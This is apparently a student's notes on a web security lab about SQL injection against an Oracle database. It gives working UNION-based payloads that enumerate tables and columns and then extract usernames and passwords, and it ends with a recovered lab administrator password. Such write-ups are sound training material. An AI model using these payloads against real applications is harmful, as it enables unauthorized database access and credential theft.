---
title: 'Lab 4 - Listing DB contents Oracle:'
updated: 2023-06-06T16:39:46.0000000+01:00
created: 2023-06-04T18:32:37.0000000+01:00
---

![image1](../../../../_resources/image1-15.png)
Same as lab 3 - but with Oracle database syntax:

***SELECT \* FROM all_tables***
***SELECT \* FROM all_tab_columns WHERE table_name = 'USERS'***

First lets perform a UNION attack to see all the table names:

'UNION+SELECT+table_name,NULL+FROM+all_tables--

This gives us a list of all table names.

'UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_BFPOND'--

This will show us the two columns inside of the USERS table:
![image2](../../../../_resources/image2-14.png)
Accessing the Columns:

Now we need to print what is inside the columns:

*'UNION+SELECT+USERNAME_ZCFLFV,PASSWORD_WUFDNK+FROM+USERS_BFPOND--*

![image3](../../../../_resources/image3-11.png)

Administrator:eef7iorfjr5ssslaptas
